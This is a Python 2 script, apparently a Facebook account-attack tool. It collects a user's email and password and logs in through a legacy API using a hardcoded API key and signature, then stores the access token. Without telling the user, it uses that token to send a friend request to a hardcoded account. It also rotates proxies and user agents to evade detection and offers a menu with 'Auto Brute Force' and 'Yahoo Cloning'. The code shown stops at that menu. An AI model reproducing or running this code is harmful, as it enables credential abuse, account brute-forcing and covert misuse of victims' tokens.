import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib
from multiprocessing.pool import ThreadPool
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
else:
    try:
        import requests
    except ImportError:
        os.system('pip2 install requests')

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
user_agent_list = [
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
 'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
 'Mozilla/5.0 (Windows NT 6.2; WOW64; Trident/7.0; rv:11.0) like Gecko',
 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)',
 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)']
proxies_list = [
 'http://10.10.1.10:3128',
 'http://77.232.139.200:8080',
 'http://78.111.125.146:8080',
 'http://77.239.133.146:3128',
 'http://74.116.59.8:53281',
 'http://67.53.121.67:8080',
 'http://67.78.143.182:8080',
 'http://62.64.111.42:53281',
 'http://62.210.251.74:3128',
 'http://62.210.105.103:3128',
 'http://5.189.133.231:80',
 'http://46.101.78.9:8080',
 'http://45.55.86.49:8080',
 'http://40.87.66.157:80',
 'http://45.55.27.246:8080',
 'http://45.55.27.246:80',
 'http://41.164.32.58:8080',
 'http://45.125.119.62:8080',
 'http://37.187.116.199:80',
 'http://43.250.80.226:80',
 'http://43.241.130.242:8080',
 'http://38.64.129.242:8080',
 'http://41.203.183.50:8080',
 'http://36.85.90.8:8080',
 'http://36.75.128.3:80',
 'http://36.81.255.73:8080',
 'http://36.72.127.182:8080',
 'http://36.67.230.209:8080',
 'http://35.198.198.12:8080',
 'http://35.196.159.241:8080',
 'http://35.196.159.241:80',
 'http://27.122.224.183:80',
 'http://223.206.114.195:8080',
 'http://221.120.214.174:8080',
 'http://223.205.121.223:8080',
 'http://222.124.30.138:80',
 'http://222.165.205.204:8080',
 'http://217.61.15.26:80',
 'http://217.29.28.183:8080',
 'http://217.121.243.43:8080',
 'http://213.47.184.186:8080',
 'http://207.148.17.223:8080',
 'http://210.213.226.3:8080',
 'http://202.70.80.233:8080']

def keluar():
    print '\x1b[1;91m[!] Exit'
    os.sys.exit()


def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


logo = '\n\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x95\xae\n\xe2\x94\x81\xe2\x94\x81\xe2\x95\xae\xe2\x95\xb0\xe2\x95\xae\xe2\x94\x8a\xe2\x94\x8a\xe2\x94\x8a\xe2\x94\x8a\xe2\x94\x8a\xe2\x94\x8a\n\xe2\x94\x8a\xe2\x94\x8a\xe2\x95\xb0\xe2\x95\xae\xe2\x95\xb0\xe2\x94\x81\xe2\x96\x82\xe2\x96\x82\xe2\x96\x82\xe2\x96\x82\xe2\x94\x8a\xe2\x94\x8a\xe2\x94\x8a\xe2\x94\x8a\xe2\x94\x8a\xe2\x94\x8a\n\xe2\x94\x8a\xe2\x96\x82\xe2\x95\xb1\xe2\x96\x94\xe2\x95\xb2\xe2\x96\x94\xe2\x95\xb1\xe2\x94\x8f\xe2\x94\xb3\xe2\x95\xae\xe2\x95\xb2\xe2\x94\x8a\xe2\x94\x8a\xe1\xb6\xa4.\xe2\x95\xad\xe2\x95\xae\n\xe2\x96\x82\xe2\x95\xb2\xe2\x96\x82\xe2\x96\x82\xe2\x95\xb1\xe2\x95\xb2\xe2\x95\xb2\xe2\x95\xb0\xe2\x94\xbb\xe2\x94\x9b\xe2\x95\xb1\xe2\x96\x94\xe2\x96\x94\xe2\x96\x94\xe2\x96\x94\xe2\x94\x83\n\xe2\x95\xb2\xe2\x96\x82\xe2\x96\x82\xe2\x95\xb1\xe2\x95\xad\xe2\x95\xaf\xe2\x95\xb1\xe2\x96\x94\xe2\x96\x94\xe2\x95\xb1\xe2\x96\x94\xe2\x96\x94\xe2\x96\x94\xe2\x96\xbd\xe2\x96\xbd\xe2\x95\xaf\n\xe2\x94\x8a\xe2\x95\xb1\xe2\x95\xb1\xe2\x95\xad\xe2\x95\xaf\xe2\x95\xb1\xe2\x96\x94\xe2\x96\x94\xe2\x96\x94\xe2\x95\xb2\xe2\x96\x82\xe2\x96\x82\xe2\x96\xb3\xe2\x96\x82\xe2\x96\xb3\xe2\x95\xae\n\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x95\xaf\xe2\x95\xb1\xe2\x95\xb1\xe2\x95\xad\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x95\xaf\n\x1b[1;97m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\x1b[1;97m    [\x1b[1;92m\xe2\x88\x9a\x1b[1;97m]\x1b[1;93mAuthor : \x1b[1;91mMaestro\n\x1b[1;97m    [\x1b[1;92m\xe2\x88\x9a\x1b[1;97m]\x1b[1;93mGithub : \x1b[1;96mgithub.com/Maestro-Alvardo\n\x1b[1;97m    [\x1b[1;92m\xe2\x88\x9a\x1b[1;97m]\x1b[1;93mVersion: \x1b[1;97m1.0.0\n\x1b[1;97m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n'
logo_lisensi = '\n\x1b[1;97m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\x1b[1;97m   [\x1b[1;92m\xe2\x88\x9a\x1b[1;97m]\x1b[1;93mAuthor : \x1b[1;91mMaestro\n\x1b[1;97m   [\x1b[1;92m\xe2\x88\x9a\x1b[1;97m]\x1b[1;93mGithub : \x1b[1;96mgithub.com/Maestro-Alvardo\n\x1b[1;97m   [\x1b[1;92m\xe2\x88\x9a\x1b[1;97m]\x1b[1;93mVersion: \x1b[1;97m1.0.0\n\x1b[1;97m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n'
banner = '\x1b[1;97m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;97m\xe2\x96\x88\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x88      \x1b[1;96m\xe2\x97\x8f\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe0\xb9\x91\xdb\xa9\xdb\xa9\xe0\xb9\x91\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x96\xac\xe2\x97\x8f\n\x1b[1;97m\xe2\x96\x88\x1b[1;91m\xe2\x96\xbc\xe2\x96\xbc\xe2\x96\xbc\xe2\x96\xbc\xe2\x96\xbc \x1b[1;97m- _ --_--\x1b[1;92m\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x8c\xe2\x94\x80   \xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97 \n\x1b[1;97m\xe2\x96\x88 \x1b[1;97m \x1b[1;97m_-_-- -_ --__\x1b[1;92m \xe2\x95\x91\xe2\x95\x91\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4\xe2\x94\x9c\xe2\x94\xac\xe2\x94\x98\xe2\x94\x9c\xe2\x94\xb4\xe2\x94\x90\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xa0\xe2\x95\xa3 \xe2\x95\xa0\xe2\x95\xa9\xe2\x95\x97\n\x1b[1;97m\xe2\x96\x88\x1b[1;91m\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2\xe2\x96\xb2\x1b[1;97m--  - _ --\x1b[1;92m\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d\xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\xb4 \xe2\x94\xb4   \xe2\x95\x9a  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \x1b[1;93mv1.7\n\x1b[1;97m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88      \x1b[1;96m\xc2\xab----------\xe2\x9c\xa7----------\xc2\xbb\n\x1b[1;97m \xe2\x96\x88\xe2\x96\x88 \xe2\x96\x88\xe2\x96\x88\n\x1b[1;97m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n\x1b[1;97m\xe2\x95\x91\x1b[1;93m* \x1b[1;97mAuthor  \x1b[1;91m: \x1b[1;96mZeDD Parker \x1b[1;97m                \xe2\x95\x91\n\x1b[1;97m\xe2\x95\x91\x1b[1;93m* \x1b[1;97mSupport \x1b[1;91m: \x1b[1;96mLimit\x1b[1;97m[\x1b[1;96meD\x1b[1;97m] \x1b[1;97m |\x1b[1;96m./R41N53\x1b[1;97m|\x1b[1;96mAl2VyN \x1b[1;97m\xe2\x95\x91\n\x1b[1;97m\xe2\x95\x91\x1b[1;93m* \x1b[1;97mGitHub  \x1b[1;91m: \x1b[1;92m\x1b[4mhttps://github.com/rezadkim\x1b[0m \x1b[1;97m\xe2\x95\x91\n\x1b[1;97m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;91m[\x1b[1;92m+\x1b[1;91m] \x1b[1;97mLoading \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
gagal = []
idteman = []
idfromteman = []
idmem = []
emmem = []
nomem = []
id = []
em = []
emfromteman = []
hp = []
hpfromteman = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'

def lisensu():
    os.system('reset')
    print '\x1b[1;97m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
    print '\x1b[1;91m[\x1b[1;92m1.\x1b[1;91m]\x1b[1;94m Sudah punya Lisensi'
    print '\x1b[1;91m[\x1b[1;92m2.\x1b[1;91m]\x1b[1;94m Beli Lisensi'
    print '\x1b[1;91m[\x1b[1;92m3.\x1b[1;91m]\x1b[1;94m Percobaan Lisensi Gratis              '
    print '\x1b[1;91m[\x1b[1;97m00\x1b[1;91m]\x1b[1;98m Exit          '
    print '\x1b[1;97m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
    pil_lisensu()


def pil_lisensu():
    print ' '
    asu = raw_input('\x1b[1;97m\x1b[1;91m[\x1b[1;92m\xe2\x80\xa2\x1b[1;91m]\x1b[1;96m>>> \x1b[1;97m')
    if asu == '':
        print 'Lol'
        pil_lisensu()
    elif asu == '1':
        lisensi()
    elif asu == '2':
        beli_lisensi()
    elif asu == '3':
        freelisen()
    elif asu == '00' or '0':
        keluar()


def lisensi():
    os.system('reset')
    print logo_lisensi
    passw = raw_input('\x1b[1;97m[\x1b[1;91mLisensi\x1b[1;97m] :\x1b[1;91m ')
    r = requests.get('https://friendcyber.000webhostapp.com/pas.txt').text
    if passw == '':
        print '\x1b[1;91m[!] Wrong'
        lisensi()
    elif len(passw) < 10:
        print '\x1b[1;91m[!] Wrong'
        lisensi()
    elif passw in r:
        print '\x1b[1;91mBerhasil...'
        time.sleep(1)
        login()
        try:
            toket = open('login.txt', 'r')
            menu()
        except (KeyError, IOError):
            login()

    else:
        print '\x1b[1;91m[!] Wrong'
        time.sleep(1)
        keluar()


def login():
    os.system('reset')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('reset')
        print logo
        print '          \x1b[1;93m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
        print '                    \x1b[1;91mLogin Akun Facebook  '
        print '          \x1b[1;93m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
        id = raw_input('\x1b[1;91m[+] \x1b[1;97mEmail/ID :\x1b[1;91m ')
        pwd = getpass.getpass('\x1b[1;91m[+] \x1b[1;97mPassword :\x1b[1;91m ')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;91m[!] No connection'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                zedd = open('login.txt', 'w')
                zedd.write(z['access_token'])
                zedd.close()
                raw_input('\n\x1b[1;97mPress any to Continue.....')
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;91m[!] No connection'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[1;91m[!] \x1b[1;93mAccount Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\n\x1b[1;91m[!] Login Failed'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()


def menu():
    os.system('reset')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('reset')
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
            a = json.loads(otw.text)
            nama = a['name']
            id = a['id']
        except KeyError:
            os.system('reset')
            print '\x1b[1;91m[!] \x1b[1;93mAccount Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[!] No connection'
            keluar()

    os.system('reset')
    print logo
    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;96mYour Information'
    print '\x1b[1;97m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
    print '\x1b[1;97m     [\x1b[1;92m\xe2\x88\x9a\x1b[1;97m]\x1b[1;93mNama   : \x1b[1;97m' + nama
    print '\x1b[1;97m     [\x1b[1;92m\xe2\x88\x9a\x1b[1;97m]\x1b[1;93mID     : \x1b[1;97m' + id
    print '\x1b[1;97m     [\x1b[1;92m\xe2\x88\x9a\x1b[1;97m]\x1b[1;93mStatus : \x1b[1;97mMember'
    print '\x1b[1;97m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
    print '\x1b[1;97m' + '               ' + '\x1b[1;91m[\x1b[1;96mMENU\x1b[1;91m]'
    print ' '
    print '\x1b[1;97m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
    print '\x1b[1;91m[\x1b[1;92m1.\x1b[1;91m]\x1b[1;94m Get Information a User'
    print '\x1b[1;91m[\x1b[1;92m2.\x1b[1;91m]\x1b[1;94m Auto Brute Force'
    print '\x1b[1;91m[\x1b[1;92m3.\x1b[1;91m]\x1b[1;94m Profile Guard               '
    print '\x1b[1;91m[\x1b[1;92m4.\x1b[1;91m]\x1b[1;94m Yahoo Cloning       '
    print '\x1b[1;91m[\x1b[1;92m99\x1b[1;91m]\x1b[1;94m LogOut            '
    print '\x1b[1;91m[\x1b[1;97m00\x1b[1;91m]\x1b[1;98m Exit          '
    print '\x1b[1;97m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d'
